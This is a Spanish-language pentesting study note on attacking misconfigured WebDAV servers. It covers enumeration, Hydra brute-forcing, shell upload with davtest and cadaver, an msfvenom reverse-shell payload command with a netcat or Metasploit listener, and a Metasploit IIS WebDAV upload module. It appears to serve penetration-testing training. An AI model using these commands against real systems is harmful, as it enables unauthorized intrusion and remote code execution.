**WebDAV** es una extensión del protocolo HTTP que permite a los clientes editar y gestionar archivos en un servidor web de forma remota, funcionando de manera similar a un servidor de archivos (como SMB o FTP) pero sobre el puerto web.

- **Puertos comunes:** 80 (HTTP) / 443 (HTTPS)
- **Riesgo:** Si está mal configurado, permite la subida de archivos (PUT) y su ejecución, lo que facilita el acceso inicial mediante shells.
## 🛠️ Metodología de Ataque
### 1. Descubrimiento y Enumeración

El primer paso es identificar si el servicio está activo y en qué ruta se encuentra (comúnmente `/webdav/`).

| **Técnicas**    | **Comando / Herramienta**                    |
| --------------- | -------------------------------------------- |
| **Nmap Script** | `nmap -p80 -sV --script=http-enum <IP>`      |
| **Fuzzing Web** | `gobuster dir -u http://<IP>/ -w <wordlist>` |
### 2. Acceso (Bypass de Autenticación)

Si al intentar acceder a la ruta encontramos un panel de login (Autenticación HTTP Básica), realizamos fuerza bruta.

- **Herramienta:** [[Hydra]]
- **Ej Comando:** `hydra -L <users_list> -P <passwords_list> <IP> http-get /webdav/`
### 3. Explotación del Servicio
Una vez obtenidas las credenciales o si el acceso es anónimo, seguimos este flujo:
#### A. Verificación de permisos con `davtest`
Esta herramienta automatiza la subida de múltiples extensiones para ver cuáles se ejecutan en el servidor.

- **Comando:** `davtest -url http://<IP>/webdav/` (Añadir `-auth user:pass` si autenticación requerida).
![[Imagenes/DavtestComando.png]]
- **Objetivo:** Identificar extensiones ejecutables (ej. `.php`, `.asp`, `.jsp`) que nos permitan ganar ejecución de comandos (RCE).
![[Imagenes/DavtestInfo.png]]

#### B. Intrusión con `cadaver`
`cadaver` es un cliente de WebDAV por línea de comandos con una interfaz similar a FTP.

- **Comando:** `cadaver http://<IP>/webdav`
- **Acciones comunes dentro de cadaver:**
    - `ls`: Listar archivos.
    - `put /ruta/a/mi/shell`: Subir nuestro archivo malicioso.
    - `get`: Descargar archivos del servidor.
    - `help`: Ver todos los comandos disponibles.

![[Imagenes/CadaverEjemplo.png]]

#### Vectores de Entrada (Payloads)
Dependiendo de lo que `davtest` haya identificado como ejecutable, prepararemos nuestra shell:

1. **Webshells integradas:** En Kali Linux, disponibles en `/usr/share/webshells/`.
2. **Reverse Shell personalizada:** Creada con [[Msfvenom]]
    - _Ejemplo para ASP:_ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<TU_PUERTO> -f asp > shell.asp`

![[Imagenes/CadaverPutWebshell.png]]

Si utilizamos el método 2, no olvidar ponernos a la escucha con:
- netcat: `nc -lvpn <PUERTO_ESCUCHA>`
- Módulo Metasploit: `exploit/multi/handler
	- Importante cambiar el payload al mismo que el creado con [[Msfvenom]]
		- Nuestro Ej anterior: `set payload windows/meterpreter/reverse_tcp`
		- `set LHOST <TU_IP>`
		- `set LPORT <TU_PUERTO>`
		- `run o exploit`

> [!warning] Sube siempre una shell del tipo de archivo que el servidor permita ejecutar (ej. si el servidor es Windows/IIS, busca extensiones `.asp` o `.aspx`).

Ahora vemos la webshell subida:
![[Imagenes/MuestraWebshell.png]]

Y podemos ejecutar comandos (RCE) en el servidor donde esté instalado Webdav 
![[Imagenes/MuestraWebshell2.png]]

#### C. Explotación con [[Metasploit]]
Módulo: `exploit/windows/iis/iis_webdav_upload_asp`
- Si autenticación requerida en webdav
	- `set HttpPassword <password>`
	- `set HttpUsername <user>` 
- `set RHOST <IP_TARGET>`
- `set PATH /ruta/webdav/shell.<extension_que_ejecute_servidor>`
- `set LHOST <TU_IP>`
- `run o exploit`
Este módulo te proporciona una shell automáticamente

---
**Navegación:**
- Volver a: [[2.2 Servicios de Windows Frecuentemente Explotados]]
- Volver a: [[3.1 Explotación Vulnerabilidades de Windows]]
